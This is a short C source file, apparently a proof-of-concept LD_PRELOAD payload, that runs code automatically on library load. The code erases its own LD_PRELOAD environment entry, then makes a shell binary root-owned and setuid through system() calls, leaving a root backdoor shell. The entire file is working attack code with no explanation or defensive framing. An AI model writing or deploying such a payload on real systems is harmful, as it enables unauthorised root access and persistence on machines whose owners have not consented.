#include "poc.h"

#include <stdlib.h>
#include <string.h>

extern char **environ;

int __attribute__((constructor)) init()
{
	char **p = environ;
	while (*p) {
		if (!strcmp(*p, LD_PRELOAD_SHELL)) {
			*p[0] = 'X';
			break;
		}
		p++;
	}

	system("/bin/chown 0:0 " SHELL " 2>/dev/null");
	system("/bin/chmod +sx " SHELL " 2>/dev/null");

	return 0;
}
